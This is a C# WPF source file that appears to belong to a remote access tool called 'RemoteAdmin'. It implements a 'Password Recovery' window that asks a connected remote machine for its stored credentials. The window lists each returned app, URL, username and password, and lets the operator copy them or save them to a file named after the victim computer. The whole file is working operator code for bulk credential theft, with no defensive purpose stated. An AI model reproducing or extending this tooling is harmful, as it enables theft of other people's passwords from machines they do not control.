using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using RemoteAdmin.Shared;

namespace RemoteAdmin.Server
{
    /// <summary>
    /// Interaction logic for PasswordRecoveryWindow.xaml
    /// </summary>
    public partial class Passwordrecoverywindow : Window
    {
        private readonly ConnectedClient _client;
        private GridViewColumnHeader _lastHeaderClicked = null;
        private ListSortDirection _lastDirection = ListSortDirection.Ascending;

        public Passwordrecoverywindow(ConnectedClient client)
        {
            InitializeComponent();
            _client = client;

            // Update window title with client info
            Title = $"Password Recovery [{_client.ComputerName}]";

            // Store reference in client
            _client.PasswordRecoveryWindow = this;

            // Load passwords when window opens
            Loaded += PasswordRecoveryWindow_Loaded;
            Closing += PasswordRecoveryWindow_Closing;
        }

        private async void PasswordRecoveryWindow_Loaded(object sender, RoutedEventArgs e)
        {
            // Request password recovery from client
            await RequestPasswordRecovery();
        }

        private void PasswordRecoveryWindow_Closing(object sender, CancelEventArgs e)
        {
            // Clear reference in client
            _client.PasswordRecoveryWindow = null;
        }

        public async System.Threading.Tasks.Task RequestPasswordRecovery()
        {
            try
            {
                if (_client?.Stream == null)
                {
                    MessageBox.Show("Client is not connected.", "Error",
                        MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }

                var request = new PasswordRecoveryRequestMessage();
                await Shared.NetworkHelper.SendMessageAsync(_client.Stream, request);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to request password recovery: {ex.Message}",
                    "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        public void UpdatePasswordList(List<RecoveredAccount> accounts)
        {
            lstPasswords.Items.Clear();

            foreach (var account in accounts)
            {
                lstPasswords.Items.Add(new PasswordItem
                {
                    Identification = account.Application,
                    Url = account.Url,
                    Username = account.Username,
                    Password = account.Password
                });
            }

            // Update window title with count
            Title = $"Password Recovery [{_client.ComputerName}] - {accounts.Count} accounts";
        }

        // Sorting functionality
        private void ListView_ColumnHeaderClick(object sender, RoutedEventArgs e)
        {
            var headerClicked = e.OriginalSource as GridViewColumnHeader;
            ListSortDirection direction;

            if (headerClicked != null && headerClicked.Role != GridViewColumnHeaderRole.Padding)
            {
                if (headerClicked != _lastHeaderClicked)
                {
                    direction = ListSortDirection.Ascending;
                }
                else
                {
                    direction = _lastDirection == ListSortDirection.Ascending
                        ? ListSortDirection.Descending
                        : ListSortDirection.Ascending;
                }

                var columnBinding = headerClicked.Column.DisplayMemberBinding as Binding;
                var sortBy = columnBinding?.Path.Path ?? headerClicked.Column.Header as string;

                Sort(sortBy, direction);

                _lastHeaderClicked = headerClicked;
                _lastDirection = direction;
            }
        }

        private void Sort(string sortBy, ListSortDirection direction)
        {
            var dataView = CollectionViewSource.GetDefaultView(lstPasswords.Items);
            dataView.SortDescriptions.Clear();
            var sd = new SortDescription(sortBy, direction);
            dataView.SortDescriptions.Add(sd);
            dataView.Refresh();
        }

        // Context menu handlers
        private void SaveAll_Click(object sender, RoutedEventArgs e)
        {
            SavePasswords(lstPasswords.Items.Cast<PasswordItem>().ToList());
        }

        private void SaveSelected_Click(object sender, RoutedEventArgs e)
        {
            var selected = lstPasswords.SelectedItems.Cast<PasswordItem>().ToList();
            if (selected.Count == 0)
            {
                MessageBox.Show("No items selected.", "Information",
                    MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }
            SavePasswords(selected);
        }

        private void CopyAll_Click(object sender, RoutedEventArgs e)
        {
            CopyToClipboard(lstPasswords.Items.Cast<PasswordItem>().ToList());
        }

        private void CopySelected_Click(object sender, RoutedEventArgs e)
        {
            var selected = lstPasswords.SelectedItems.Cast<PasswordItem>().ToList();
            if (selected.Count == 0)
            {
                MessageBox.Show("No items selected.", "Information",
                    MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }
            CopyToClipboard(selected);
        }

        private void ClearAll_Click(object sender, RoutedEventArgs e)
        {
            var result = MessageBox.Show(
                "Are you sure you want to clear all recovered passwords?",
                "Confirm Clear",
                MessageBoxButton.YesNo,
                MessageBoxImage.Question);

            if (result == MessageBoxResult.Yes)
            {
                lstPasswords.Items.Clear();
                Title = $"Password Recovery [{_client.ComputerName}]";
            }
        }

        private void ClearSelected_Click(object sender, RoutedEventArgs e)
        {
            var selected = lstPasswords.SelectedItems.Cast<PasswordItem>().ToList();
            if (selected.Count == 0)
            {
                MessageBox.Show("No items selected.", "Information",
                    MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }

            foreach (var item in selected)
            {
                lstPasswords.Items.Remove(item);
            }

            Title = $"Password Recovery [{_client.ComputerName}] - {lstPasswords.Items.Count} accounts";
        }

        private async void Refresh_Click(object sender, RoutedEventArgs e)
        {
            lstPasswords.Items.Clear();
            await RequestPasswordRecovery();
        }

        // Helper methods
        private void SavePasswords(List<PasswordItem> items)
        {
            if (items.Count == 0)
            {
                MessageBox.Show("No passwords to save.", "Information",
                    MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }

            var saveFileDialog = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*",
                FileName = $"Passwords_{_client.ComputerName}_{DateTime.Now:yyyyMMdd_HHmmss}.txt",
                DefaultExt = "txt"
            };

            if (saveFileDialog.ShowDialog() == true)
            {
                try
                {
                    var format = txtFormat.Text;
                    var lines = items.Select(item => FormatPasswordLine(item, format));
                    File.WriteAllLines(saveFileDialog.FileName, lines);

                    MessageBox.Show(
                        $"Successfully saved {items.Count} password(s) to:\n{saveFileDialog.FileName}",
                        "Success",
                        MessageBoxButton.OK,
                        MessageBoxImage.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Failed to save passwords: {ex.Message}",
                        "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }

        private void CopyToClipboard(List<PasswordItem> items)
        {
            if (items.Count == 0)
            {
                MessageBox.Show("No passwords to copy.", "Information",
                    MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }

            try
            {
                var format = txtFormat.Text;
                var lines = items.Select(item => FormatPasswordLine(item, format));
                var text = string.Join(Environment.NewLine, lines);

                Clipboard.SetText(text);

                MessageBox.Show(
                    $"Successfully copied {items.Count} password(s) to clipboard.",
                    "Success",
                    MessageBoxButton.OK,
                    MessageBoxImage.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to copy to clipboard: {ex.Message}",
                    "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private string FormatPasswordLine(PasswordItem item, string format)
        {
            return format
                .Replace("APP", item.Identification ?? "")
                .Replace("URL", item.Url ?? "")
                .Replace("USER", item.Username ?? "")
                .Replace("PASS", item.Password ?? "");
        }
    }

    // Helper class for displaying passwords in the ListView
    public class PasswordItem
    {
        public string Identification { get; set; }
        public string Url { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
    }
}